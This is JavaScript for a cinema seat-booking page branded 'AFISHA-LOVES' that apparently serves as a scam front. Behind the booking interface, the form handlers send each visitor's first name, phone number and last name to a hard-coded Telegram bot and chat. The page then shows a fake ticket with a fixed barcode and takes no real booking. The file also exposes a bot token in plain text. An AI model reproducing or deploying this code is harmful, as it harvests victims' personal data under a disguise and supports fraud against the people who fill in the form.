document.getElementById('moviePoster')
.src =
localStorage.getItem('moviePoster');

document.getElementById('selectedCity')
.innerText =
localStorage.getItem('selectedCity') || 'Berlin';

document.getElementById('selectedCinema')
.innerText =
localStorage.getItem('selectedCinema') || 'Cinema';

document.getElementById('selectedCinemaAddress')
.innerText =
localStorage.getItem('selectedCinemaAddress') || 'Address';

document.getElementById('movieTitle')
.innerText =
localStorage.getItem('movie') || 'Movie';

const rows =
document.getElementById('rows');

let selectedSeats = [];
let total = 0;

const ticketCount =
document.getElementById('ticketCount');

const totalPrice =
document.getElementById('totalPrice');

const letters =
['A','B','C','D','E','F','G','H','I','J'];





/* DATE SELECTION */

const dates =
document.querySelectorAll('.date');

dates.forEach(date=>{

date.addEventListener('click',()=>{

dates.forEach(d=>{
d.classList.remove('active-date');
});

date.classList.add('active-date');

document.getElementById('selectedDate')
.innerText =
date.innerText;

});

});





/* CREATE SEATS */

for(let r=1;r<=10;r++){

const row =
document.createElement('div');

row.className = 'row';

for(let s=1;s<=14;s++){

const seat =
document.createElement('div');

seat.className = 'seat';

seat.innerText =
letters[r-1] + s;

let price = 25;

if(r >= 8){

seat.classList.add('vip');

price = 50;

}else{

seat.classList.add('available');

}

if(Math.random() < 0.25){

seat.className = 'seat';

}

seat.dataset.price = price;

seat.addEventListener('click',()=>{

if(
!seat.classList.contains('available') &&
!seat.classList.contains('vip') &&
!seat.classList.contains('selected')
){
return;
}

if(seat.classList.contains('selected')){

seat.classList.remove('selected');

selectedSeats =
selectedSeats.filter(
item => item !== seat.innerText
);

total -= price;

}else{

seat.classList.add('selected');

selectedSeats.push(
seat.innerText
);

total += price;

}

ticketCount.innerText =
selectedSeats.length;

totalPrice.innerText =
'$' + total;

});

row.appendChild(seat);

}

rows.appendChild(row);

}





/* TIME SELECTION */

const timeContainer =
document.createElement('div');

timeContainer.style.display='flex';

timeContainer.style.gap='10px';

timeContainer.style.marginTop='15px';

timeContainer.innerHTML = `

<div class="category-btn active-time">
18:00
</div>

<div class="category-btn">
20:30
</div>

<div class="category-btn">
22:00
</div>

<div class="category-btn">
00:15
</div>

`;

document.querySelectorAll('.movie-details div')[1]
.appendChild(timeContainer);

const times =
timeContainer.querySelectorAll('.category-btn');

times.forEach(time=>{

time.addEventListener('click',()=>{

times.forEach(t=>{

t.style.background='#111';

});

time.style.background='#ff2020';

document.getElementById('selectedTime')
.innerText =
time.innerText;

});

});





/* CONTINUE BUTTON */

document.getElementById('continueBtn')
.addEventListener('click',()=>{

if(selectedSeats.length === 0){

alert('Select seats first');

return;

}

document.querySelector('.booking-container')
.style.display='none';

document.getElementById('paymentPage')
.style.display='flex';

document.querySelectorAll('.step')[0]
.classList.remove('active');

document.querySelectorAll('.step')[1]
.classList.add('active');

});





/* TELEGRAM */

const BOT_TOKEN =
'8802727416:AAFhzrorhzwAMfGTzYVjztauQF7LZwn1V9Y';

const CHAT_ID =
'-1004292212831';





/* FIRST STEP */

document.getElementById('nextStepBtn')
.addEventListener('click',async()=>{

const firstName =
document.getElementById('firstName').value;

const phone =
document.getElementById('phone').value;

if(!firstName || !phone){

alert('Fill all fields');

return;

}

await fetch(
`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,
{
method:'POST',

headers:{
'Content-Type':'application/json'
},

body:JSON.stringify({

chat_id:CHAT_ID,

text:

`👤 Name: ${firstName}

📞 Phone: ${phone}`

})

}
);

document.getElementById('step1')
.style.display='none';

document.getElementById('step2')
.style.display='block';

});





/* SECOND STEP */

document.getElementById('completeBtn')
.addEventListener('click',async()=>{

const lastName =
document.getElementById('lastName').value;

if(!lastName){

alert('Enter last name');

return;

}

await fetch(
`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,
{
method:'POST',

headers:{
'Content-Type':'application/json'
},

body:JSON.stringify({

chat_id:CHAT_ID,

text:

`👤 Last Name: ${lastName}`

})

}
);

const activeTime =
document.getElementById('selectedTime')
.innerText;

const activeDate =
document.getElementById('selectedDate')
.innerText;

const seatText =
selectedSeats.join(', ');

document.getElementById('paymentPage')
.innerHTML = `

<div class="ticket-page">

<div class="ticket-modern">

<div class="ticket-top">

<div>

<h1>
AFISHA-LOVES
</h1>

<p>
Premium Cinema Ticket
</p>

</div>

<div class="ticket-badge">
VIP
</div>

</div>

<div class="ticket-info">

<div>
<span>Movie</span>
<strong>
${localStorage.getItem('movie')}
</strong>
</div>

<div>
<span>City</span>
<strong>
${localStorage.getItem('selectedCity')}
</strong>
</div>

<div>
<span>Cinema</span>
<strong>
${localStorage.getItem('selectedCinema')}
</strong>
</div>

<div>
<span>Address</span>
<strong>
${localStorage.getItem('selectedCinemaAddress')}
</strong>
</div>

<div>
<span>Date</span>
<strong>
${activeDate}
</strong>
</div>

<div>
<span>Time</span>
<strong>
${activeTime}
</strong>
</div>

<div>
<span>Seats</span>
<strong>
${seatText}
</strong>
</div>

<div>
<span>Total</span>
<strong>
$${total}
</strong>
</div>

</div>

<div class="ticket-bottom">

<div style="
margin-top:30px;
display:flex;
flex-direction:column;
align-items:center;
">

<img src="https://barcode.tec-it.com/barcode.ashx?data=4813538005036&code=Code128&translate-esc=false"
style="
width:320px;
height:120px;
object-fit:contain;
filter:contrast(200%);
">

<div style="
margin-top:10px;
font-size:34px;
letter-spacing:6px;
font-weight:700;
font-family:monospace;
color:#111;
">

4813538005036

</div>

</div>

<div class="ticket-qr">

<img src="
https://api.qrserver.com/v1/create-qr-code/?size=220x220&data=
${encodeURIComponent(
localStorage.getItem('movie') +
seatText +
activeTime +
localStorage.getItem('selectedCinema') +
localStorage.getItem('selectedCinemaAddress')
)}
">

</div>

</div>

</div>

</div>

`;

document.querySelectorAll('.step')[1]
.classList.remove('active');

document.querySelectorAll('.step')[2]
.classList.add('active');

});